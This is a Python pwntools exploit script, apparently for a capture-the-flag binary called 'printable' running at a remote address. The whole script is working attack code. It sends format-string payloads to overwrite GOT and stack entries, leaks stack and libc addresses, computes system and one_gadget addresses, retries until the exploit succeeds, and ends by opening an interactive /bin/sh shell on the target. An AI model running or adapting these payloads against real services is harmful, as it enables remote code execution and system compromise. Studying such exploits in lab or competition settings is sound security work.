from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
context.terminal = ['/mnt/d/wsl-terminal-tabbed/open-wsl.exe','-e']

while(1):
    debug = 0
    if debug:
        p = process('./printable')
        #p = process('./printable_patch')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        offset = 0xf1207
        #gdb.attach(p, 'b *0x40094d')
    else:
        p = remote("139.162.123.119",10307)
        libc = ELF('./libc_64.so.6')
        offset = 0xf0567
    try:
        p.recvuntil("Input :")
        p.send("%0584c%42$hnAAA"+"%1754c%14$n"+"%0027c%15$hhn"+"%0256c%16$hn%0229c%17$hhn"+p64(0x601000)+p64(0x601002)+p64(0x601020)+p64(0x601021))

        #p.send("%0584c%42$hn"+"%1757c%14$n"+"%0027c%15$hhn" + 'A' * 0x1c + p64(0x601000) + p64(0x601002))
        #pause()
        p.send("%23$p%32$p%"+str(2313)+"c%23$hhn\x00")
        s = p.recv(0x40)
        stack = int(s[:14], 16)
        libc_addr = int(s[14:28], 16) - (libc.symbols['exit'] - 0x38)
        log.success('stack:' + hex(stack))
        log.success('libc_addr:' + hex(libc_addr))
        system=libc_addr+libc.symbols["system"]
        binsh=libc_addr+libc.search("/bin/sh").next()
        log.success('system:' + hex(system))
        log.success('bin/sh:' + hex(binsh))
        stdout = libc_addr + libc.symbols['_IO_2_1_stdout_']
        log.success('stdout:' + hex(stdout))
        one_gadget = libc_addr + offset
        one = [one_gadget & 0xFFFF, (one_gadget >> 16) & 0xFFFF, (one_gadget >> 32) & 0xFFFF, (one_gadget >> 48) & 0xFFFF]
        print(one)
        log.success('one_gadget:' + hex(one_gadget))
        prdi=0x00000000004009c3

        #gdb.attach(p, 'b *0x40094d')
        #pause()
        '''
        payload = "%"+str(0x25)+"c%23$hhn%" + str(0x100 - 0x25) + 'c%21$hhn'
        payload = payload.ljust(0x40, 'A') + p64(stdout + 0x70 - 0xe0)
        p.send(payload)
        
        pause()
        payload = "%"+str(0x25)+"c%23$hhn%" + str(0x120 - 0x25) + 'c%21$hhn%' + str(0x126 - 0x20) + 'c%22$hhn'  
        payload = payload.ljust(0x40, 'A') + p64(0x601020) + p64(0x601021) 
        p.send(payload)
        '''
        #pause()
        payload = '%' + str(one[0]) + 'c%21$hn%' + str((one[1] + 0x10000) - one[0]) + 'c%22$hn%'  + str((one[2] + 0x10000) - one[1]) + 'c%23$hn'
        payload = payload.ljust(0x40, '\x00') + p64(stack) + p64(stack+0x2) + p64(stack+0x4)
        p.send(payload)
        
    except:
        p.close()
        continue
    else:
        break

p.sendline('/bin/sh 1>&0')
p.interactive()